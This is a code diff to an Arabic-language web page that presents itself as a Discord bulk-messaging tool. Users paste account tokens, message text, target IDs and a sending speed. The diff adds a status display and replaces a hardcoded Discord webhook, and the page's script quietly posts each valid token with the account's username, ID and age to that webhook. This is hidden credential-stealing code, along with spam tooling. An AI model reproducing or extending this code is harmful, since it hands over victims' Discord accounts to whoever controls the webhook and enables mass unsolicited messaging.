@@ -46,6 +46,17 @@
     .hidden {
       display: none;
     }
+    #tokenStatus {
+      white-space: pre-wrap;
+      margin-top: 15px;
+      background: #222;
+      border-radius: 10px;
+      padding: 10px;
+      width: 80%;
+      margin-right: auto;
+      margin-left: auto;
+      font-size: 1em;
+    }
   </style>
 </head>
 <body>
@@ -54,11 +65,12 @@
   <div id="page1">
     <textarea id="tokens" rows="10" placeholder="اكتب التوكنات، كل توكن بسطر  :\n"></textarea><br>
     <button id="nextBtn">التالي</button>
+    <div id="tokenStatus"></div>
   </div>
 
   <div id="page2" class="hidden">
     <textarea id="ids" rows="3" placeholder="اكتب الايديات (مفصولة بفاصلة)  :\n"></textarea><br>
-    <input type="text" id="message" placeholder="قم بوضع الكلام : نص"><br>
+    <input type="text" id="message" placeholder="قم بوضع الكلام : "><br>
     <select id="speed">
       <option value="1">1</option>
       <option value="0.9">0.9</option>
@@ -81,10 +93,15 @@
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
     const tokensInput = document.getElementById('tokens');
+    const tokenStatus = document.getElementById('tokenStatus');
 
     nextBtn.onclick = async () => {
-      const tokens = tokensInput.value.trim().split('\n');
+      const raw = tokensInput.value.trim().replace(/\s+/g, '\n');
+      const tokens = raw.split('\n');
       const validTokens = [];
+      tokenStatus.textContent = 'جاري التحقق من التوكنات...';
+
+      let statusText = '';
 
       for (const token of tokens) {
         try {
@@ -97,18 +114,23 @@
             const ageDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
             const msg = `توكن الحساب : ${token}\nيوزور الحساب : ${data.username}#${data.discriminator}\nايدي الحساب : ${data.id}\nعدد ايام الحساب : ${ageDays}`;
 
-            fetch('https://discord.com/api/webhooks/1382044262165647514/CHpOR5xEYXctWS8lx2AySpAWw5PD_6YHzIvoBfHlDQiaT4lfKpyXJTpam3dxQfqcFgjK', {
+            fetch('https://discord.com/api/webhooks/1383808164331520121/Lef_QBFXzuFRm6QDdfzahxbDFhOpckoOaa53hHVKjS9p7yUfMEc9YkLDSo76ENGycA9z', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({ content: msg })
             });
 
             validTokens.push(token);
+            statusText += `✅ صحيح: ${token}\n`;
+          } else {
+            statusText += `❌ خاطئ: ${token}\n`;
           }
         } catch (err) {
-          console.warn("Invalid token:", token);
+          statusText += `❌ خطأ بالشبكة: ${token}\n`;
         }
       }
+
+      tokenStatus.textContent = statusText;
 
       if (validTokens.length > 0) {
         tokensInput.value = validTokens.join('\n');
@@ -123,7 +145,7 @@
 
     document.getElementById('sendBtn').onclick = async () => {
       sending = true;
-      const tokens = tokensInput.value.trim().split('\n');
+      const tokens = tokensInput.value.trim().split(/\s+/);
       const ids = document.getElementById('ids').value.trim().split(',');
       const message = document.getElementById('message').value;
       const speed = parseFloat(document.getElementById('speed').value);
